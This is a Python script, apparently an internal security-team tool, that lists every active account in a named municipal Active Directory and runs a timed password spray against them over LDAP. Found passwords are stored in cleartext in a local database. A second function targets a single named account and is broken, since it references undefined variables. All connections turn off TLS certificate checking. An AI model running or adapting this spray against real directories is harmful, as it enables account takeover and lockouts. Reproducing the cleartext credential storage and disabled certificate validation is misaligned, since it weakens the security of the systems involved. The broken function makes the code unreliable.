from misc_scripts import secrets
import ldap
import os
from ldap.controls.pagedresults import SimplePagedResultsControl
import time
import datetime
import sqliteconnect as SQLC

def LDAPSearch(lpath, lfilter, lproperties, ltimeout):
	import ldap, os
	server = 'ldaps://ldaps.oslofelles.oslo.kommune.no:636'
	user = os.environ["CSIRT_LDAPUSER"]
	password = os.environ["CSIRT_LDAPPASSWORD"]

	ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
	ldap.set_option(ldap.OPT_PROTOCOL_VERSION, 3)
	ldapClient = ldap.initialize(server)
	ldapClient.timeout = ltimeout
	ldapClient.set_option(ldap.OPT_REFERRALS, 0)
	ldapClient.bind_s(user, password)
	return ldapClient.search_s(lpath, ldap.SCOPE_SUBTREE, lfilter, lproperties)
	



def LDAPGetUserInfo(username):
	ldap_properties = ['cn', 'mail', 'givenName', 'displayName', 'sn', 'userAccountControl', 'logonCount', 'memberOf', 'lastLogonTimestamp', 'title', 'description', 'otherMobile', 'mobile', 'objectClass']
	ldap_filter = ('(&(objectClass=user)(cn=%s))' % username)
	ldap_path = "DC=oslofelles,DC=oslo,DC=kommune,DC=no"
	results = LDAPSearch(ldap_path, ldap_filter, ldap_properties, 10)
	return results


def LDAPGetUsers(userfilter=None):
	# Fetches all usersnames from AD and adds them to a list
	ldap_server  = 'ldaps://ldaps.oslofelles.oslo.kommune.no:636'
	ldap_username  = os.environ["CSIRT_LDAPUSER"]
	ldap_password  = os.environ["CSIRT_LDAPPASSWORD"]
	ldap_base =  "DC=oslofelles,DC=oslo,DC=kommune,DC=no"
	if userfilter:
		ldap_filter = "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=512)(sAMAccountName={}*))".format(userfilter)
	else:
		ldap_filter = "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=512))"

	ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
	ldap.set_option(ldap.OPT_PROTOCOL_VERSION, 3)
	ldap_conn = ldap.initialize(ldap_server)
	ldap_conn.set_option(ldap.OPT_REFERRALS, 0)
	ldap_conn.bind_s(ldap_username, ldap_password)

	ldap_page_size = 1000
	all_users = []
	page_control = SimplePagedResultsControl(True, size=ldap_page_size, cookie='')
	while True:
		result = ldap_conn.search_ext(ldap_base,ldap.SCOPE_SUBTREE,ldap_filter,['sAMAccountName'],serverctrls=[page_control])
		_, search_results, _, server_controls = ldap_conn.result3(result)

		for entry in search_results:
			try:
				all_users.append(entry[0].split(",")[0].split("=")[1])
			except:
				continue

		page_control.cookie = server_controls[0].cookie
		if not page_control.cookie:
			break
	return all_users

def InsertPWDSpray(conn, user, password):
    # Check if entry already exists
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM alerts_passwordspray WHERE user = ? AND password = ?", (user, password))
    result = cur.fetchone()
    if result[0] > 0:
        # Entry already exists, do not insert new data
        print("Entry already exists for user with the same password.")
        conn.close()
        return
    
    # Insert new data
    sql = """INSERT INTO alerts_passwordspray(user, password, userinfo, scan_time) VALUES(?,?,?,?)"""
    values = (user, password, str(LDAPGetUserInfo(user)), str(datetime.date.today()))
    cur.execute(sql, values)
    conn.commit()
    conn.close()

def LDAPInit():
	ldap_server  = 'ldaps://ldaps.oslofelles.oslo.kommune.no:636'
	username  = os.environ["CSIRT_LDAPUSER"]
	password  = os.environ["CSIRT_LDAPPASSWORD"]
	base_dn =  "DC=oslofelles,DC=oslo,DC=kommune,DC=no"
	ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_NEVER)
	ldap.set_option(ldap.OPT_PROTOCOL_VERSION, 3)
	ldap_conn = ldap.initialize(ldap_server)
	ldap_conn.set_option(ldap.OPT_REFERRALS, 0)
	return ldap_conn

def LDAPBruteForce(username_filter):
	ldap_conn = LDAPInit()
	password_file = "/var/csirt/source/CVE-WEB/scripts/scriptfiles/passwords.txt"
	usernames = LDAPGetUsers(username_filter)
	with open(password_file) as file:
		passwords = [line.rstrip() for line in file]
	pass_length = len(passwords)
	pass_start = 0
	pass_end = 3
	incrementvalue = 3

	while pass_length > pass_start:
		for user in usernames:
			of_user = "OSLOFELLES\\{}".format(user)
			for pwd in passwords[pass_start:pass_end]:
				try:
					ldap_conn.bind_s(of_user, pwd)
					print("Credentials found for user: {}, {}".format(user, pwd))
					InsertPWDSpray(SQLC.SQLiteConnect(), user, pwd)
				except ldap.INVALID_CREDENTIALS:
					pass
		pass_start += incrementvalue
		pass_end += incrementvalue
		ldap_conn.unbind_s()
		time.sleep(300)
		ldap_conn = LDAPInit()


def LDAPChristian():
	ldap_conn = LDAPInit()
	password_file = "/var/csirt/source/CVE-WEB/scripts/scriptfiles/passwords.txt"
	count = 0
	of_user = "OSLOFELLES\\UKE373745"
	for pwd in passwords[pass_start:pass_end]:
		print("Count: {}".format(count))
		try:
			ldap_conn.bind_s(of_user, pwd)
			print("Credentials found for user: {}, {}".format(user, pwd))
			InsertPWDSpray(SQLC.SQLiteConnect(), user, pwd)
		except ldap.INVALID_CREDENTIALS:
			pass
		ldap_conn.unbind_s()
		ldap_conn = LDAPInit()
		time.sleep(2)
		
		
#LDAPBruteForce("DRIFT")
LDAPChristian()